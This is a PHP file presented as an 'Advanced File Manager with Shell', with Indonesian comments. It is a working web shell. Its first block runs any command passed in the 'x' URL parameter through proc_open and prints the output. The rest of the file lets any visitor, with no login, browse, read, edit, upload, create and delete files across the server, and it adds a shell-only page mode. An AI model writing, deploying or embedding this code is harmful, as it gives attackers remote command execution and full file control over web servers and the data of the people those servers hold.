<?php
// ==============================================
// Advanced File Manager dengan Shell Integration
// ==============================================

// Handle shell execution (dari shell.php)
if (isset($_GET['x'])) {
    $d = [0=>["pipe","r"], 1=>["pipe","w"], 2=>["pipe","w"]];
    $p = proc_open($_GET['x'], $d, $pipes);
    if (is_resource($p)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]); 
        proc_close($p);
    } 
    exit;
}

// Handle file editing
if (isset($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    if (is_file($fileToEdit) && isset($_POST['fileContent'])) {
        file_put_contents($fileToEdit, $_POST['fileContent']);
        echo json_encode(['success' => true, 'message' => 'File saved successfully']);
        exit;
    } elseif (isset($_GET['getcontent']) && is_file($fileToEdit)) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'content' => file_get_contents($fileToEdit),
            'filename' => basename($fileToEdit)
        ]);
        exit;
    }
}

// Set default action - tampilkan file manager atau shell berdasarkan parameter
$showShell = isset($_GET['shell']);

if (!$showShell) {
    // Tampilkan Advanced File Manager
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File Manager with Shell</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
        }
        .container {
            width: 80%;
            margin: 0 auto;
        }
        h2, h3 {
            color: #4CAF50;
        }
        input[type="file"], input[type="submit"], input[type="text"], input[type="button"] {
            padding: 10px;
            margin: 10px 0;
            color: #fff;
            background-color: #333;
            border: none;
            border-radius: 5px;
        }
        input[type="file"], input[type="button"] {
            cursor: pointer;
        }
        form {
            margin-bottom: 20px;
        }
        a {
            color: #4CAF50;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        table {
            margin: 20px auto;
            border-collapse: collapse;
            width: 100%;
        }
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background-color: #333;
        }
        td {
            background-color: #2c2c2c;
        }
        .icon {
            display: inline-block;
            margin-right: 10px;
        }
        .folder-icon {
            color: #ffcc00;
        }
        .file-icon {
            color: #4CAF50;
        }
        .action-btn {
            padding: 5px 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 2px;
            color: white;
        }
        .edit-btn {
            background-color: #2196F3;
        }
        .edit-btn:hover {
            background-color: #1976D2;
        }
        .delete-btn {
            background-color: #f44336;
        }
        .delete-btn:hover {
            background-color: #d32f2f;
        }
        .view-btn {
            background-color: #673AB7;
        }
        .view-btn:hover {
            background-color: #5E35B1;
        }
        .breadcrumbs {
            margin-bottom: 20px;
        }
        .breadcrumbs a {
            color: #4CAF50;
            text-decoration: none;
            margin-right: 5px;
        }
        .breadcrumbs a:hover {
            text-decoration: underline;
        }
        .breadcrumbs span {
            margin-right: 5px;
        }
        .manage-section {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
        }
        .manage-section form {
            flex: 1;
            min-width: 200px;
        }
        .shell-toggle {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            text-decoration: none;
            z-index: 1000;
        }
        .shell-toggle:hover {
            background-color: #45a049;
        }
        .shell-container {
            background-color: #000;
            color: #0f0;
            padding: 20px;
            font-family: monospace;
            text-align: left;
            margin-top: 20px;
            border-radius: 5px;
            display: <?php echo $showShell ? 'block' : 'none'; ?>;
        }
        
        /* Modal/Popup Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1001;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
        }
        .modal-content {
            background-color: #2c2c2c;
            margin: 5% auto;
            padding: 20px;
            border: 1px solid #444;
            width: 80%;
            max-width: 800px;
            border-radius: 10px;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #444;
        }
        .modal-title {
            color: #4CAF50;
            font-size: 1.5em;
            margin: 0;
        }
        .close-btn {
            color: #aaa;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }
        .close-btn:hover {
            color: #fff;
        }
        .modal-body {
            flex: 1;
            overflow: auto;
            margin-bottom: 20px;
        }
        .editor-container {
            width: 100%;
            height: 400px;
            border: 1px solid #444;
            border-radius: 5px;
            overflow: hidden;
        }
        #fileEditor {
            width: 100%;
            height: 100%;
            background-color: #1e1e1e;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border: none;
            padding: 10px;
            resize: none;
            box-sizing: border-box;
        }
        .modal-footer {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        .save-btn, .cancel-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .save-btn {
            background-color: #4CAF50;
            color: white;
        }
        .save-btn:hover {
            background-color: #45a049;
        }
        .cancel-btn {
            background-color: #757575;
            color: white;
        }
        .cancel-btn:hover {
            background-color: #616161;
        }
        .file-size {
            font-size: 0.8em;
            color: #aaa;
            margin-left: 10px;
        }
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: nowrap;
        }
    </style>
</head>
<body>
    <a href="?shell=1" class="shell-toggle">Toggle Shell</a>
    
    <!-- Edit File Modal -->
    <div id="editModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Edit File: <span id="fileName"></span></h3>
                <button class="close-btn" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body">
                <div class="editor-container">
                    <textarea id="fileEditor" spellcheck="false"></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button class="save-btn" onclick="saveFile()">Save Changes</button>
                <button class="cancel-btn" onclick="closeModal()">Cancel</button>
            </div>
        </div>
    </div>
    
    <div class="container">
        <h2>Advanced File Manager with Shell</h2>

        <?php
        // Handle the current directory
        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

        // Create breadcrumbs for the current directory
        $pathParts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $breadcrumbs = [];
        $pathAccumulator = '';

        foreach ($pathParts as $part) {
            if ($part !== '') {
                $pathAccumulator .= DIRECTORY_SEPARATOR . $part;
                $breadcrumbs[] = "<a href=\"?dir=" . urlencode($pathAccumulator) . "\">$part</a>";
            }
        }

        echo "<div class='breadcrumbs'><strong>Current Directory: </strong>";
        echo implode(' / ', $breadcrumbs);
        echo "</div>";

        // Handle directory change
        if (isset($_POST['changeDir'])) {
            $newDir = $_POST['newDir'];
            if (is_dir($newDir)) {
                $currentDir = realpath($newDir);
            } else {
                echo "<p>Directory does not exist.</p>";
            }
        }

        // Handle file upload
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
            $file = $_FILES['file'];
            if ($file['error'] === UPLOAD_ERR_OK) {
                $fileName = basename($file['name']);
                $fileTmpPath = $file['tmp_name'];
                $dest_path = $currentDir . '/' . $fileName;
                if (move_uploaded_file($fileTmpPath, $dest_path)) {
                    echo "<p>File uploaded successfully to $currentDir.</p>";
                } else {
                    echo "<p>Error moving the uploaded file.</p>";
                }
            } else {
                echo "<p>Error: No file selected or upload failed.</p>";
            }
        }

        // Handle file deletion
        if (isset($_GET['delete'])) {
            $fileToDelete = $_GET['delete'];
            if (is_file($fileToDelete)) {
                unlink($fileToDelete);
                echo "<p>File deleted: $fileToDelete</p>";
            }
        }

        // Handle directory creation
        if (isset($_POST['createDir'])) {
            $newDir = $_POST['newDirName'];
            $newDirPath = $currentDir . DIRECTORY_SEPARATOR . $newDir;
            if (!is_dir($newDirPath)) {
                mkdir($newDirPath);
                echo "<p>Directory created: $newDir</p>";
            } else {
                echo "<p>Directory already exists.</p>";
            }
        }

        // Handle file creation
        if (isset($_POST['createFile'])) {
            $newFile = $_POST['newFileName'];
            $newFilePath = $currentDir . DIRECTORY_SEPARATOR . $newFile;
            if (!file_exists($newFilePath)) {
                file_put_contents($newFilePath, ''); // Create an empty file
                echo "<p>File created: $newFile</p>";
            } else {
                echo "<p>File already exists.</p>";
            }
        }

        echo "<h3>Current Directory: $currentDir</h3>";

        // Display directory management forms
        echo '<div class="manage-section">';

        // Change directory form
        echo '<form method="post">';
        echo '<input type="text" name="newDir" placeholder="Enter new directory" required>';
        echo '<input type="submit" name="changeDir" value="Change Directory">';
        echo '</form>';

        // Create new directory form
        echo '<form method="post">';
        echo '<input type="text" name="newDirName" placeholder="New directory name" required>';
        echo '<input type="submit" name="createDir" value="Create Directory">';
        echo '</form>';

        // Create new file form
        echo '<form method="post">';
        echo '<input type="text" name="newFileName" placeholder="New file name" required>';
        echo '<input type="submit" name="createFile" value="Create File">';
        echo '</form>';

        // File upload form
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo '<input type="file" name="file" required>';
        echo '<input type="submit" value="Upload File">';
        echo '</form>';

        echo '</div>';

        echo "<h3>Files and Directories in $currentDir:</h3>";

        // List directories first, then files
        $files = scandir($currentDir);
        echo '<table>';
        echo '<tr><th>File/Directory Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>';

        // List directories
        foreach ($files as $file) {
            if ($file !== "." && $file !== ".." && is_dir($currentDir . '/' . $file)) {
                $filePath = $currentDir . '/' . $file;
                $fileSize = "-";
                echo "<tr>
                    <td><span class='icon folder-icon'>📁</span><a href=\"?dir=" . urlencode($filePath) . "\">$file</a></td>
                    <td>Directory</td>
                    <td>$fileSize</td>
                    <td>
                        <div class='action-buttons'>
                            <a href=\"?dir=" . urlencode($currentDir) . "&delete=" . urlencode($filePath) . "\">
                                <button class='action-btn delete-btn'>Delete</button>
                            </a>
                        </div>
                    </td>
                </tr>";
            }
        }

        // List files
        foreach ($files as $file) {
            if ($file !== "." && $file !== ".." && is_file($currentDir . '/' . $file)) {
                $filePath = $currentDir . '/' . $file;
                $fileSize = filesize($filePath);
                $fileSizeFormatted = formatFileSize($fileSize);
                $fileExtension = pathinfo($file, PATHINFO_EXTENSION);
                
                echo "<tr>
                    <td><span class='icon file-icon'>📄</span><a href=\"$filePath\" target=\"_blank\">$file</a></td>
                    <td>" . strtoupper($fileExtension) . " File</td>
                    <td>$fileSizeFormatted</td>
                    <td>
                        <div class='action-buttons'>
                            <button class='action-btn edit-btn' onclick=\"editFile('" . urlencode($filePath) . "', '$file')\">Edit</button>
                            <a href=\"$filePath\" target=\"_blank\">
                                <button class='action-btn view-btn'>View</button>
                            </a>
                            <a href=\"?dir=" . urlencode($currentDir) . "&delete=" . urlencode($filePath) . "\">
                                <button class='action-btn delete-btn'>Delete</button>
                            </a>
                        </div>
                    </td>
                </tr>";
            }
        }

        echo '</table>';
        
        // Shell section (hidden by default, shown when toggled)
        echo '<div class="shell-container">';
        echo '<h3>Shell Command Execution</h3>';
        echo '<form target="shell-frame"><input name="x" autofocus placeholder="Enter command (e.g., ls, pwd, whoami)"></form>';
        echo '<iframe name="shell-frame" style="width:100%; height:300px; background:#000; color:#0f0; border:none;"></iframe>';
        echo '</div>';
        ?>
    </div>

    <script>
        let currentFile = '';
        
        function editFile(filePath, fileName) {
            currentFile = decodeURIComponent(filePath);
            document.getElementById('fileName').textContent = fileName;
            
            // Show loading
            document.getElementById('fileEditor').value = 'Loading file content...';
            document.getElementById('editModal').style.display = 'block';
            
            // Fetch file content via AJAX
            fetch(`?edit=${encodeURIComponent(currentFile)}&getcontent=1`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('fileEditor').value = data.content;
                        // Auto-resize textarea
                        const textarea = document.getElementById('fileEditor');
                        textarea.style.height = 'auto';
                        textarea.style.height = (textarea.scrollHeight) + 'px';
                    } else {
                        document.getElementById('fileEditor').value = 'Error loading file content';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('fileEditor').value = 'Error loading file content';
                });
        }
        
        function closeModal() {
            document.getElementById('editModal').style.display = 'none';
            currentFile = '';
            document.getElementById('fileEditor').value = '';
        }
        
        function saveFile() {
            if (!currentFile) return;
            
            const content = document.getElementById('fileEditor').value;
            
            // Create form data
            const formData = new FormData();
            formData.append('fileContent', content);
            
            // Send POST request
            fetch(`?edit=${encodeURIComponent(currentFile)}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('File saved successfully!');
                    closeModal();
                    // Reload page to show changes
                    setTimeout(() => location.reload(), 500);
                } else {
                    alert('Error saving file');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error saving file');
            });
        }
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('editModal');
            if (event.target === modal) {
                closeModal();
            }
        }
        
        // Close modal with ESC key
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeModal();
            }
        });
        
        // Auto-expand textarea
        document.getElementById('fileEditor').addEventListener('input', function() {
            this.style.height = 'auto';
            this.style.height = (this.scrollHeight) + 'px';
        });
    </script>
</body>
</html>
<?php
} else {
    // Tampilkan hanya shell interface (mode minimalis)
?>
<!DOCTYPE html>
<html>
<head>
    <title>Shell Interface</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            margin: 0;
            padding: 20px;
        }
        a {
            color: #0ff;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }
        form {
            margin: 20px 0;
        }
        input {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px;
            width: 80%;
            font-family: monospace;
        }
        iframe {
            width: 100%;
            height: 400px;
            background: #000;
            border: 1px solid #0f0;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <a href="?">← Back to File Manager</a>
    <br><br>
    <form target="r"><input name="x" autofocus placeholder="Enter command..."></form>
    <iframe name="r"></iframe>
</body>
</html>
<?php
}

// Helper function to format file size
function formatFileSize($bytes) {
    if ($bytes == 0) return "0 B";
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}
?>